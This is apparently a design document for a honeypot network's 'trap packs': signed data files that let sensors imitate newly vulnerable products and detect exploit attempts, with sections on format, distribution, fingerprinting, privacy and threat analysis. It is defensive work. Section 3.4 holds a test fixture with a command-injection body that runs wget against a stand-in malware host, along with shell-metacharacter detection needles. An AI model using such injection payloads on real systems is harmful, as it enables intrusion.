# M37: trap packs for new CVEs

Status: phases 1 and 2 implemented (P2: signed distribution). The owner's decisions are in section 13.

## 1. Problem and goals

When a new CVE is published, attackers often start scanning for it within days, sometimes hours. Today a new trap needs a code change in a sensor, a release and then the 48 h auto-update floor. By the time every node has it, the first wave is over.

M37 adds **trap packs**: small, signed data files that teach the sensors a new trap without a release. One pack is written per CVE, published once, and reaches every node (owner's and participants') within the hour. The network then sees whether and when the flaw is exploited in the wild.

Goals:

- G1. A new HTTP trap can go from "CVE published" to "running on every online node" in hours.
- G2. Old packs stay loaded. A 1 GiB lite node always has room for new ones.
- G3. Each node shows, per relevant CVE, whether it has a trap and when it first saw a hit.
- G4. The public observatory shows, per new flaw, how long it took from publication to the first exploit attempt seen by the network, within the M34 anonymity rules.

Non-goals:

- N1. Never execute attacker input. A pack is data. The engine only searches bytes and fills fixed templates.
- N2. No new outbound path. Sensors keep no route out; they never fetch packs. Ingest fetches through the paths it already has.
- N3. Packs do not replace stateful emulation (the PHP2Shell session tracking, the fake shells, the XML-RPC engine). That stays in code.
- N4. Packs do not open ports. A non-HTTP trap needs the owner to open a port (section 7).

## 3. Pack format

Packs are authored in YAML in the repository (`traps/packs/<id>.yaml`) and compiled to canonical JSON by `just trap-build`. Sensors read JSON only (stdlib, no YAML parser in the sensor image). One validator, `suckerpot_common.traps`, is shared by the sensors, ingest and CI, so all three agree on what is valid.

### 3.1 Top level

| Field | Type and bounds | Meaning |
| --- | --- | --- |
| `schema` | `suckerpot-trap/1` | Format id. A breaking change becomes `/2` |
| `id` | `^[a-z0-9][a-z0-9-]{2,47}$` | Stable pack id, for example `acme-edgegate-cve-2026-55501` |
| `version` | int, 1 to 65535 | Raised on every change. A higher version replaces a lower one |
| `engine` | int, 1 to 255 | Lowest engine version that understands the pack. A sensor with an older engine skips it (`engine_too_new`) |
| `sensor` | `web` or `banner` | Which sensor loads it |
| `title` | text, 1 to 120 chars | Shown on the dashboard |
| `cve` | list, 0 to 8, `CVE-YYYY-NNNN` to `CVE-YYYY-NNNNNNN` | CVEs the pack is about (dashboard, observatory) |
| `disclosed` | day | Public disclosure day of the flaw |
| `product` | `{vendor, name}`, 1 to 40 chars each | What the trap pretends to be |
| `group` | slug, optional | Exclusive persona group, for example `vpn-appliance` (section 6) |
| `presence` | 0.05 to 1.0, default 1.0 | Share of installs that answer as this product (section 6). Detection is always on |
| `tag` | slug, 3 to 40 chars | Local tag for exploit hits, for example `acme-edgegate-rce` |
| `attack` | list, 0 to 4, `T####` or `T####.###` | Optional ATT&CK technique ids |
| `traps` | list, 1 to 16 | The traps |

### 3.2 A web trap

| Field | Bounds | Meaning |
| --- | --- | --- |
| `id` | slug, 1 to 32 chars, unique in the pack | |
| `level` | `probe` or `exploit` | Probe: the client checks whether the product is here (a version page, a login form). Exploit: the request carries the exploit shape (the vulnerable parameter plus a payload) |
| `match.method` | subset of `GET HEAD POST PUT DELETE PATCH OPTIONS`; empty = any | |
| `match.path` | exactly one of `exact`, `prefix`, `suffix`, `contains`; 1 to 256 bytes; optional | On the percent-decoded (twice), lowercased path, as `detect.py` does |
| `match.query_keys` | 0 to 8 names | All must be present (decoded, lowercased) |
| `match.header_names` | 0 to 8 names | All must be present |
| `match.needles` | 0 to 6 conditions, ANDed | Each is `{in, any}`: `in` is one of `path`, `query`, `body`, `headers`, `blob`; `any` is 1 to 16 needles, 2 to 256 bytes each. A condition holds if one needle is found |
| `match.case` | `insensitive` (default) or `exact` | Exact compares the decoded bytes without lowercasing |
| `outcome.flags` | 1 to 4, `^[a-z][a-z0-9_]{2,31}$` | Flags added to the event. Exploit-level flags join `SEVERE` |
| `outcome.claim_cve` | bool; default `true` for exploit, forbidden for probe | Adds the pack's `cve` list to `data.cve` |
| `respond` | optional | The fake answer (3.3). Without it the trap only observes and the site answers as before |

The search areas are the ones the detector already builds, with the same caps: `path` and `query` (decoded, 4 KiB), `body` (first 16 KiB, decoded), `headers` (`name: value` lines, 32 KiB), `blob` (path, query and body joined, 24 KiB). Needles are printable ASCII strings, or `hex:` followed by 4 to 512 hex digits for raw bytes. There is no regex, no wildcard, no back-reference and no repetition.

**Evidence rule.** A trap that claims a CVE (the only kind of hit that can make an address reportable, section 10) must hold specific evidence: at least one needle of 6 bytes or more in `query`, `body`, `headers` or `blob`, or a `path` condition of 12 bytes or more on a path the built-in site does not serve. The validator refuses a claiming trap without it. This keeps a pack from turning `GET /` into an "exploit". The traps converted in P1 claim no CVE, exactly like the code they replace.

### 3.3 The fake response

| Field | Bounds | Meaning |
| --- | --- | --- |
| `kind` | `php`, `static` or `error` | Serialisation and header order from `response.py` |
| `status` | one of 200 201 204 301 302 400 401 403 404 405 500 503 | |
| `content_type` | one of `text/html; charset=UTF-8`, `text/plain`, `application/json`, `text/xml`, `application/xml` | |
| `headers` | 0 to 6, name from an allow-list (`Cache-Control`, `Set-Cookie`, `WWW-Authenticate`, `X-Frame-Options`, `Location`, `Pragma`, `Expires`), value up to 512 bytes | `Location` must be a path or start with `{base_url}` |
| `variants` | 1 to 4 bodies, each a template | One is chosen per install (section 6) |

Templates have placeholders only, no logic: `{hostname}`, `{server_ip}` (the profile's fake private address), `{site_title}`, `{base_url}`, `{server_token}`, `{php_version}`, `{date_http}`, `{year}`, `{install_date}`, `{rand_hex:N}` and `{rand_int:A-B}` (stable per install and pack, from `profile.derive`), and `{echo:query:KEY}` (the decoded value of one query key, cut to 64 bytes and filtered to `A-Za-z0-9._-`, so it cannot inject markup). A rendered body is at most 16 KiB of UTF-8 text.

Content rules, checked by the validator: no `http://` or `https://` outside `{base_url}`; no `<script`, `<iframe`, `<object`, `<embed` or `<form action=` pointing elsewhere; no `suckerpot`, `selfhostr` or `honeypot` in any case. A pack can make a node answer like a vulnerable product. It cannot make it host a link, a script or a download for someone else.

### 3.4 Example (fictional product and CVE)

```yaml
schema: suckerpot-trap/1
id: acme-edgegate-cve-2026-55501
version: 1
engine: 1
sensor: web
title: Acme EdgeGate pre-auth command injection
cve: [CVE-2026-55501]
disclosed: 2026-11-18
product: {vendor: Acme, name: EdgeGate}
group: vpn-appliance
presence: 0.5
tag: acme-edgegate-rce
attack: [T1190]
traps:
  - id: version-probe
    level: probe
    match:
      method: [GET, HEAD]
      path: {exact: /api/v1/version}
    outcome: {flags: [edgegate_probe]}
    respond:
      kind: php
      status: 200
      content_type: application/json
      variants:
        - '{"product":"EdgeGate","version":"7.2.{rand_int:1-4}","build":"{rand_hex:8}"}'
        - '{"product":"EdgeGate","version":"7.1.{rand_int:6-9}","build":"{rand_hex:8}"}'
  - id: diag-rce
    level: exploit
    match:
      method: [POST]
      path: {exact: /api/v1/diag/ping}
      needles:
        - {in: body, any: ["host="]}
        - {in: body, any: [";", "|", "$(", "`", "${ifs}"]}
    outcome: {flags: [edgegate_rce]}
    respond:
      kind: php
      status: 200
      content_type: application/json
      variants:
        - '{"status":"ok","target":"{echo:query:host}","rtt_ms":{rand_int:9-40}}'
```

Golden fixtures live next to it (section 9), for example a raw request `POST /api/v1/diag/ping` with body `host=192.0.2.10;wget http://malware.example.net/x` that must give flags `edgegate_rce`, `rce` and the built-in download extraction of `http://malware.example.net/x`.

### 3.5 What a pack cannot express

- State across requests (PHP2Shell's session follow-up, login then action), timing and delays.
- Computation on the payload: no hashing, arithmetic, decoding beyond the shared percent-decoding, no fake command output that depends on the command. Static output (`uid=33(www-data)`) is allowed.
- Reading or naming files, any network action, URL extraction (the built-in extractors still run on every request), new listening ports on the web sensor, TLS behaviour.
- Binary bodies, headers outside the allow-list, redirects to another host.
- Removing or changing a built-in flag or `data` field.

### 3.6 How packs compose with the built-in site

1. The built-in detector runs first, unchanged. Pack flags are added to its flags; a pack never removes one.
2. Every loaded trap is matched on every request (detection is never gated by persona or presence).
3. **Response.** If one or more matching traps have `respond` and are active on this install, the most specific one answers instead of the site: `exact` path, then `prefix` (longest first), then `suffix`, then `contains`, then no path; then the most conditions; then pack id order. Otherwise the site answers as before.
4. **Reserved paths.** On a path the built-in site serves (`/`, `/index.php`, `/wp-login.php`, `/xmlrpc.php`, `/wp-admin/*`, `/wp-json/*`, `/phpmyadmin/*`, `/pma/*`, `/robots.txt`, `/favicon.ico`, `/info.php`, `/phpinfo.php`, the static files), a trap may respond only if it also has a `query_keys` or `needles` condition. A WordPress plugin CVE on `admin-ajax.php?action=x` can answer; a pack cannot replace the login page.
5. **Conflicts.** CI refuses a bundle in which two responding traps have the same specificity on overlapping matches. At run time the deterministic order above decides and the loser is reported as `shadowed`.

## 4. Loading in the sensor

| Topic | Decision |
| --- | --- |
| Bundled packs | Every pack in `traps/packs/` at release time is copied into the image at `/app/traps/bundled.json` (signed as part of the image; no pack key needed) with its `bundled_seq` |
| Downloaded packs | `/traps/active.json` and `active.json.minisig` on the `trap-packs` volume, mounted **read-only** in `sensor-web` (and `sensor-banner`), read-write only in `ingest` |
| Signature in the sensor | The sensor verifies the minisign signature itself with `TRAP_PACK_KEY` (passed from `network-defaults.env`). A compromised ingest cannot inject a trap. Ed25519 comes from `cryptography`, already a dependency |
| Which wins | A downloaded bundle with `seq` below the image's `bundled_seq` is ignored (after an update the image is newer). Per pack id, the higher `version` wins |
| Reload | The sensor stats the file every 30 s (mtime, size, inode). On a change it reads, verifies, validates and compiles a new immutable `TrapSet`, then swaps one reference. Requests in flight finish with the old set. No restart |
| Invalid pack | Rejected with a reason (`schema`, `limits`, `evidence`, `content`, `engine_too_new`, `over_limit`); the other packs load. A bad signature or an unparsable bundle keeps the current set (at start: bundled only) |
| Kill list | The signed bundle's `disabled` list and the local `TRAP_PACKS_DISABLED` are applied after validation; both can disable bundled packs too |
| Status | Every `http_request` event carries `data.trap_seq`. Hits carry `data.traps`: up to 4 entries `{pack, v, trap, level}`. Ingest runs the same validator on the same files, so it knows what each sensor loaded and why a pack was rejected; the sensor logs rejections by id and reason only |

**Limits (web sensor, same values on lite).**

| Item | Limit |
| --- | --- |
| Bundle file | 1 MiB (JSON), 64 packs |
| One pack | 64 KiB (JSON), 16 traps |
| Traps loaded | 512 in total, of which at most 32 without a path condition (they are searched on every request) |
| Needles | 16 per condition, 6 conditions per trap, 2 to 256 bytes each |
| Compiled memory | 4 MiB per `TrapSet`, so 8 MiB at peak during a swap (6 % of the 128 MiB lite limit) |
| Match cost | p99 under 2 ms added per request with every limit filled, measured in CI on the web load test |

**Room for new CVEs.** Packs are loaded newest `disclosed` first. A quarter of every limit is reserved for packs disclosed in the last 90 days, so old packs can never crowd out a new one. When the old packs pass 75 % of the remaining room, maintainers compact them (merge needles, drop response variants of packs that no longer get probed). If a node still runs out, the oldest packs stop loading there first, and the dashboard says so.

## 5. Distribution outside releases

| Topic | Decision |
| --- | --- |
| Bundle | One file, `traps.json`: `{schema: "suckerpot-traps/1", seq, issued_at, bundled_seq_min, packs: [...], disabled: [{id, reason}]}`. Signed with minisign; the trusted comment is `suckerpot-traps seq=<seq>` |
| Key | A **dedicated pack key** (minisign, Ed25519), `TRAP_PACK_KEY=RW...` in `config/network-defaults.env`. Not the feed key: that one is online on the hub server, and a hub compromise must not let anyone push traps to every node. Not cosign: ingest and sensors cannot reach Sigstore, and participants' `hubproxy` allows only two hosts |
| Who signs | A workflow `trap-packs.yml`, run on a commit of `main` (reviewed, checks green), in a protected GitHub environment `trap-packs` with the owner as required reviewer, like the `release` environment. The private key is a secret of that environment (D1) |
| Where | The workflow attaches `traps.json` and its signature to a fixed GitHub release `trap-packs`. The hub worker polls it every 10 min through its proxy, verifies signature and `seq`, and copies the bytes unchanged to the feed site: `https://<HUB_FEEDS_DOMAIN>/v1/traps/traps.json` (+ `.minisig`, `.gz`). The hub relays; it cannot sign |
| Rollback | `seq` is a monotonic integer. Ingest stores the highest verified `seq` (table `trap_state`, like `network_feed_state`) and refuses a lower one; the sensor also refuses a `seq` lower than the one it has loaded. A key change starts a new `seq` space, only through a release (`TRAP_PACK_KEY_NEXT`, as `next_key_id` in the feed) |
| Who fetches | `ingest`, never the sensor. Full mode: through the egress gate (VPN proxy), the `suckerpot_egress` client, to the host of `NETWORK_FEED_URL` only. Participant direct mode: through `hubproxy`, which already allows the feed host. HTTPS, `GET`, no redirect, no query, `User-Agent: spn-feed/1`, 1 MiB cap (4 MiB inflated), 120 s deadline, JSON depth check (`ingest/ingest/jsondepth.py`) |
| Storage | Ingest verifies, then writes `active.json.tmp` and its signature, `fsync`, and renames over `active.json` on the `trap-packs` volume |
| Cadence | Ingest checks every 30 min with up to 5 min jitter, with a conditional `GET`; at start it checks at once. Switch: `TRAP_PACKS_REMOTE` (default `true` when a route exists) |
| Offline and no egress | Packs never expire. A node keeps its last bundle for ever and fetches the newest one when it comes back. A full install without the `egress` profile has bundled packs only; `just trap-import traps.json traps.json.minisig` lets the owner load a bundle downloaded elsewhere (same verification). The dashboard shows the bundle age and warns after 7 days without a successful check |
| Kill switch | Network-wide: a new bundle with the pack in `disabled` (minutes). Local: `TRAP_PACKS_DISABLED=id,id` or `TRAP_PACKS_REMOTE=false` in `.env`. Key compromise: a release that rotates `TRAP_PACK_KEY` |

**Speed.** Merge to `main`, then approval: the bundle is signed in about a minute. The hub copies it within 10 min, ingest within 35 min, the sensor within 30 s. Every online node runs it **within about 45 minutes**, against at least 48 h for a release.

**Why skipping the 48 h floor is acceptable.** The floor protects against bad *code*, which runs with the full rights of a container. A pack runs no code: the engine is fixed, ships through the normal release chain and enforces the bounds above. The worst a bad pack can do is listed in section 10: shape fake answers within the content rules, add flags and tags, cost bounded CPU and memory. The one consequence that reaches other people, making addresses reportable, is held back 48 h (section 10, gate G).

## 6. Fingerprinting

The same pack on every node makes the network easy to recognise: a scanner can send the trap's request and compare the answer byte by byte. Worse, a node that answers as WordPress, phpMyAdmin, a VPN appliance and a router at once is not a real server.

Mitigations:

1. **Detection is everywhere, answers vary.** Matching runs on every node for every pack. Many exploit waves spray blindly, so a node that answers 404 still sees and flags them. Only the answer depends on the install.
2. **Per-install variation from the existing identity.** The web profile secret (`profile.json`) chooses, per pack, one of the `variants` (`profile.rng("trap:<pack id>")`), and fills `{rand_hex}`, `{rand_int}` and the dates. The banner sensor gets its own secret the same way. The network node key is never used: the sensor does not have it, and it must stay unlinkable to the attack surface.
3. **Persona.** Per `group`, an install answers as at most one product, chosen by the same secret, and a pack answers on only `presence` of installs. An install that does not answer still detects.
4. **Lint.** CI renders each responding trap with 20 test profiles and reports how many bytes are identical across all of them. The reviewer checks that what stays identical is what the real product also sends.

Residual risk: someone who reads the public repository knows every trap. They can still recognise "answers like EdgeGate 7.x" plus "runs WordPress". Packs are not secret; they must be plausible.

## 7. Non-HTTP CVEs: the banner sensor

A new container, `sensor-banner`, with the same hardening as the other sensors (read-only root, no capabilities, user 10001, internal network to Redis only, Redis user `sensor-banner` with `XADD events:banner`). It loads packs with `sensor: banner`.

A banner pack has `listeners` instead of HTTP traps:

| Field | Bounds | Meaning |
| --- | --- | --- |
| `id` | slug | |
| `proto` | `tcp` or `udp` | |
| `port` | 1 to 65535, not a port a built-in sensor uses | The public port the real product uses |
| `banner` | 0 to 4 KiB, text with placeholders or `hex:` | Sent on connect (TCP) |
| `steps` | 0 to 16, each `{when: {any: [...]}, send, flags, level, close}` | On the bytes received so far (8 KiB window), the first matching step answers. Each step fires once |
| `idle_timeout_s` | 5 to 30 | |

Bounds: 16 listeners loaded, 64 connections, 4 per address, 30 s per connection, 8 KiB read per connection. **UDP**: one reply per datagram, never larger than the datagram, at most 10 replies per source per minute, so a node can never be used as an amplifier.

**Ports.** Docker publishes ports when the container is created, so the sensor has four fixed slots, container ports 9001 to 9004 (TCP) and 9101 to 9102 (UDP):

```yaml
ports:
  - "${BANNER_BIND_1:-127.0.0.1}:${BANNER_PORT_1:-49001}:9001"
```

By default a slot listens on loopback only and is unreachable. A listener runs in the slot whose `BANNER_PORT_n` equals its `port`. `just trap-ports` lists the active banner packs that wait for a port and prints the command, for example `just set BANNER_PORT_1=8291 BANNER_BIND_1=0.0.0.0`. Nothing opens a port by itself: it changes the attack surface and is the owner's choice.

Be honest with members: **an HTTP trap needs nothing from the owner. A new port does.** A VPS has a public address, so the published port works at once (and the provider firewall, if any, must allow it). A home node also needs a port forward on the router, by hand. UPnP is not used. The dashboard says "pack X waits for port 8291".

**Lite slot.** `sensor-banner` is opt-in on every install, lite included (D6): `SENSOR_BANNER=1`, or `just sensors`. Its limit is 48 MiB in the low-memory and lite overlays (pure asyncio, no TLS), 64 MiB otherwise, and its compiled packs are capped at 2 MiB. The room stays reserved: the lite budget is documented as 1,424 MiB with the four default sensors and 1,472 MiB with the banner sensor on, and that figure is what the lite guardrail checks. So a lite node can turn it on for a non-HTTP pack without giving up a sensor. The web sensor's pack budget (section 4) is the HTTP slot and costs no new container.

The banner sensor sends a new network service, `banner`. `SERVICES` is closed, so a hub release adds it first; nodes send it only once `/v1/info` lists it. The CVE tag says which flaw it was.

## 8. CVE watch and dashboard

- Ingest records each pack it verified or found bundled in a table `trap_packs` (id, version, cves, sensor, state: `active`, `disabled`, `rejected`, `waits_for_port`, reason, first active time), and each first hit in `trap_hits` (pack, trap, level, first and last time, count per day).
- Ingest builds tagging rules from the active packs: an exploit hit gets the pack `tag` and one `cve-*` tag per CVE; a probe hit gets `service-probe`. The CVE watch's `cve_tags` map is extended with each pack's CVEs, so "seen in our traffic" works with no hand edit of `relevance.yaml`.
- The CVE page gets a **Trap** column (`active vN since <day>`, `disabled: <reason>`, `waits for port 8291`, `update needed`, `none`) and a **First hit here** column (first probe and first exploit, exact local time; local data, never sent). A relevant KEV entry with no trap is highlighted.

## 9. Network and observatory

**What a node shares.** Nothing new on the wire. An exploit hit adds `cve-YYYY-NNNN` to the source's tags for that UTC day, already in `spn/1`, with day buckets, the identity guard and every M29 rule unchanged. Probe hits are not shared per CVE (D5). The 48 h gate (section 10) applies to the `exploit` activity, not to the tag.

**Hub aggregation.** The hub learns the CVE list from the signed bundle it relays (`trap_cves`: cve, pack id, disclosed day, pack first published day). The first exploit day of a CVE is the earliest frozen `observatory_daily` row, metric `tag`, key `cve-...`, with at least 3 eligible nodes (`nodes >= 3`), frozen once in `observatory_cve_first` and never recomputed.

**Public section** in `network.json` (additive, schema stays `selfhostr-network-stats/1`): `new_flaws`, titled "New flaws: from publication to first exploit attempt". At most 50 entries, packs disclosed in the last 365 days:

| Field | Meaning |
| --- | --- |
| `cve` | Only CVEs named by a signed pack, so the hub never names attacker-chosen digits |
| `disclosed_day`, `trap_day` | Public disclosure; first day the pack was published |
| `first_seen` | Day (`2026-11-20`) or ISO week (`2026-W47`) of the first exploit attempt seen by 3 eligible nodes, or null |
| `days_to_first_seen` | From `disclosed_day`; null when `first_seen` is null; a range for a week |
| `status` | `seen`, `not_seen_yet`, or `too_few_nodes` (fewer than 3 eligible nodes had the pack that day) |

Privacy limits:

- k = 3 eligible nodes on one day, eligibility as M34 rule 2; Sybils cannot unlock an entry.
- Days are published only once the network has 10 eligible nodes; before that `first_seen` is an ISO week. The M34 activity lag (4 days) applies, so an entry appears at least 4 days after the day.
- A per-CVE count is never published, only the first day or week.
- Residual risk: someone who suspects 3 addresses are nodes can send the exploit to them before the real wave and watch for a `first_seen`. It works once per CVE (the value is frozen), only before the real wave, and it reveals that the addresses are sensors, not who runs them. The same probe already works on the M34 tag list.

## 10. Security analysis

**Assets.** The nodes' public addresses and reputation, the members' anonymity, the honesty of network tags and reports, sensor availability.

**A malicious or compromised pack** (stolen pack key, bad review):

| Attack | Bound |
| --- | --- |
| Run code, read files, open connections | Impossible: no field names a file, host or command; templates have no logic; the static tests (`test_static.py`) still ban exec, regex, outbound sockets and writes outside `/data` in the engine |
| Exhaust CPU or memory | Needle and trap counts, sizes and the 4 MiB compiled cap; matching is linear; the CI cost test and the memory guard back it up |
| Serve harmful content from every node | No external URL, no script, iframe or object, 16 KiB text, allow-listed headers and content types |
| Flag benign traffic as exploit, so many addresses become reportable | Evidence rule (3.2); CI runs every pack against a benign corpus (`traps/fixtures/benign/`: browser, crawler and monitoring requests, plus the WordPress and phpMyAdmin pages the site serves) and refuses any claiming hit; **gate G**: for 48 h after a pack first loads on a node, its CVE tags are shared but do not set the `exploit` activity, so they make nobody reportable. That matches the release floor where consequences reach other people, while visibility stays immediate |
| Shadow a built-in page | Reserved paths (3.6); flags are only added |
| Make every node answer a unique marker, to map the network | Possible within the content rules. This is the fingerprint risk of section 6. The project could do the same with a release; signing, review and the public repository make it visible |
| Disable every trap | Possible through `disabled`. Visible on the dashboard; a denial, not a compromise |

**A compromised fetcher path.** The hub, the feed host or a network attacker can withhold a bundle or replay an old one: `seq` refuses rollback, the dashboard warns after 7 days. They cannot forge one: ingest and the sensor both verify the pack key. A compromised ingest can stop updates or delete the file (the sensor falls back to bundled packs), not add traps. The fetch reuses the feed client's bounds; nothing in the bundle is logged, fetched or executed.

**Key handling.** The private key never reaches the hub or a node. The public key ships in `network-defaults.env`, covered by the release manifest. Rotation and revocation only through a release.

## 11. Authoring workflow when a CVE drops

1. **Trigger.** The CVE watch marks a KEV or NVD entry relevant, or the owner picks one.
2. **Scaffold.** `just trap-new CVE-2026-55501` creates `traps/packs/<id>.yaml` from a template and `traps/fixtures/<id>/` with `exploit-*.http`, `probe-*.http`, `benign-*.http` and `expect.yaml` (flags, level, status, response hash for a fixed test profile).
3. **Write.** Requests come from the advisory and public analyses, rewritten with documentation addresses and domains (`192.0.2.0/24`, `example.net`).
4. **Checks (CI, `just trap-check`).** Schema and limits, evidence rule, content rules, golden fixtures, the benign corpus gives no claiming hit, conflicts with other packs and reserved paths, cost benchmark, variation report.
5. **Plausibility checklist (human).** Status, headers and body shape match the real product's documented answers; version strings in the vulnerable range; nothing identical across installs that the product would not also send; no claim of success that needs state; probe and exploit levels correct.
6. **Security review.** Pull request labelled `trap-pack`, reviewed by the owner (CODEOWNERS on `traps/`). The reviewer reads the diff of the compiled JSON, not only the YAML.
7. **Publish.** Merge, approve the `trap-packs` environment, the bundle goes out. The next release bundles the pack into the images.
8. **Targets.** With public exploit details: 4 h from disclosure to merge, 5 h to every online node. With an advisory only: a probe trap on the product's paths first, the exploit trap when details appear.

**Retirement.** Packs are kept and stay loaded. A pack is disabled only when: it flags benign traffic; a published scanner signature uses it to spot SuckerPot; it costs too much CPU or memory; its content raises a legal or abuse problem. Disabling is a signed `disabled` entry with a reason; the pack stays in the repository and can come back as a new version.

## 13. Decisions

| # | Topic | Decision |
| --- | --- | --- |
| D1 | Pack signing | A protected GitHub environment, `trap-packs`, with the owner as required reviewer. The private key is a secret of that environment. No offline signing step |
| D2 | Gate G | 48 h, the same as the release floor. During that time a pack's CVE tags are shared but do not count as `exploit` activity |
| D3 | `presence` | Default 1.0: every install answers as the product, as the goal is coverage on every node. Persona groups still apply, so an install answers as at most one product per group. An author lowers `presence` when a product would look out of place on most nodes |
| D4 | Reflection | `{echo:query:KEY}` is kept: one query value, cut to 64 bytes, filtered to `A-Za-z0-9._-` |
| D5 | Probe hits on the network | Not shared per CVE in M37. Sharing them needs new tags in `spn/1` (for example `probe-cve-*`) and a hub release first, so it is left for later, after P3 |
| D6 | Banner sensor on lite | Opt-in on every install, not in the default lite list. Its 48 MiB stay reserved in the documented lite budget (1,472 MiB with it on), so turning it on fits |
| D7 | Banner slots | 4 TCP and 2 UDP |
| D8 | Observatory precision | `first_seen` is a day once the network has 10 eligible nodes, an ISO week before that |
| D9 | phpunit | P1 keeps today's behaviour exactly. A separate change after P1 makes a bare `GET` on the eval-stdin path a probe and keeps `phpunit_rce` for a request that sends PHP code. Release notes mention the change to tags and stats |

No question is open.
